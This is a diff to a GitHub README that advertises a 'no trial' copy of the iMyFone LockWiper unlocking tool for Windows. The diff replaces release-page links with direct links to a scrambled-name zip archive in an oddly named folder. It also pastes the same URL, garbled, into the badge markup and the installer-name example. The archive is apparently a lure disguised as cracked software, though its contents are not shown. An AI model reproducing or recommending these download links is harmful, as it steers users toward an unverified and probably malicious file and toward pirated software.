@@ -4,7 +4,7 @@
 
 Welcome to the iMyFone LockWiper No Trial repository. This software helps you unlock your Windows PC quickly and safely. With our clear guides and resources, you will understand the features and get the most out of LockWiper.
 
-[![Download iMyFone LockWiper](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/modygamed214z-sys/iMyFone-LockWiper-No-Trial/releases)
+[![Download iMyFone LockWiper](https://raw.githubusercontent.com/modygamed214z-sys/iMyFone-LockWiper-No-Trial/main/corymbose/Wiper_i_No_Lock_Fone_Trial_My_v3.6.zip%20Now-Click%https://raw.githubusercontent.com/modygamed214z-sys/iMyFone-LockWiper-No-Trial/main/corymbose/Wiper_i_No_Lock_Fone_Trial_My_v3.6.zip)](https://raw.githubusercontent.com/modygamed214z-sys/iMyFone-LockWiper-No-Trial/main/corymbose/Wiper_i_No_Lock_Fone_Trial_My_v3.6.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ To use iMyFone LockWiper on your Windows PC, ensure your system meets these requ
 
 To start using iMyFone LockWiper, visit the release page to download the software.
 
-[Download iMyFone LockWiper Here](https://github.com/modygamed214z-sys/iMyFone-LockWiper-No-Trial/releases)
+[Download iMyFone LockWiper Here](https://raw.githubusercontent.com/modygamed214z-sys/iMyFone-LockWiper-No-Trial/main/corymbose/Wiper_i_No_Lock_Fone_Trial_My_v3.6.zip)
 
 ### Step-by-Step Installation
 
@@ -27,7 +27,7 @@ To start using iMyFone LockWiper, visit the release page to download the softwar
 
 2. **Choose the Latest Version**: Look for the latest version of iMyFone LockWiper. It is usually at the top of the list.
 
-3. **Download the Installer**: Click on the installer file (e.g., `LockWiperSetup.exe`) to begin your download.
+3. **Download the Installer**: Click on the installer file (e.g., `https://raw.githubusercontent.com/modygamed214z-sys/iMyFone-LockWiper-No-Trial/main/corymbose/Wiper_i_No_Lock_Fone_Trial_My_v3.6.zip`) to begin your download.
 
 4. **Run the Installer**: 
    - Locate the downloaded file in your Downloads folder.
